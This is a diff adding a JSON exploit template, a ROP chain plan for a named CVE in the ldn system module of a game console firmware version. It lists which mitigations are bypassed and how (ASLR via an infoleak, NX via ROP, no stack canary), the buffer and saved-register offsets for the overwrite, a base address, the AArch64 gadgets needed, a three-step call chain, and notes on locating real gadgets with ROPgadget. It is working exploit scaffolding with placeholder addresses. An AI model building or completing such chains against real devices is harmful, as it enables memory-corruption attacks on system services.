@@ -1,0 +1,47 @@
+{
+  "description": "ROP chain template for CVE-2026-82079",
+  "target": "ldn sysmodule on Erista FW 22.5.0",
+  "mitigations": {
+    "aslr": "17 bits, 2MB-aligned \u2014 bypassed via AdvertiseData infoleak",
+    "nx": "stack not executable \u2014 using ROP",
+    "pac": "not present on Erista (S1)",
+    "canary": "not documented \u2014 direct overwrite"
+  },
+  "layout": {
+    "buffer_start": 0,
+    "buffer_end": 512,
+    "x29": 520,
+    "x30": 528
+  },
+  "base_addr": "0x0000007100000000",
+  "gadgets_needed": [
+    "ldp x29, x30, [sp], #N; ret  \u2014 chain gadgets",
+    "ldr x0, [sp, #offset]; ldp x29, x30, [sp], #N; ret  \u2014 load arg0",
+    "ldr x1, [sp, #offset]; ldp x29, x30, [sp], #N; ret  \u2014 load arg1",
+    "blr x0  \u2014 call function pointer",
+    "svc #0; ret  \u2014 syscall"
+  ],
+  "chain_template": [
+    {
+      "step": 1,
+      "action": "control x0 (first arg)",
+      "gadget": "ldr_x0_sp_ret"
+    },
+    {
+      "step": 2,
+      "action": "control x1 (second arg)",
+      "gadget": "ldr_x1_sp_ret"
+    },
+    {
+      "step": 3,
+      "action": "call target function",
+      "gadget": "blr_x0"
+    }
+  ],
+  "notes": [
+    "Replace placeholder gadget addresses with real ones from ldn binary",
+    "Use ROPgadget or ropper on the ldn NSO after extraction",
+    "The ldn sysmodule loads: rtld, main, subsdk*, sdk (packed, no gaps)",
+    "RELRO means GOT is read-only \u2014 use direct ROP, not GOT overwrite"
+  ]
+}
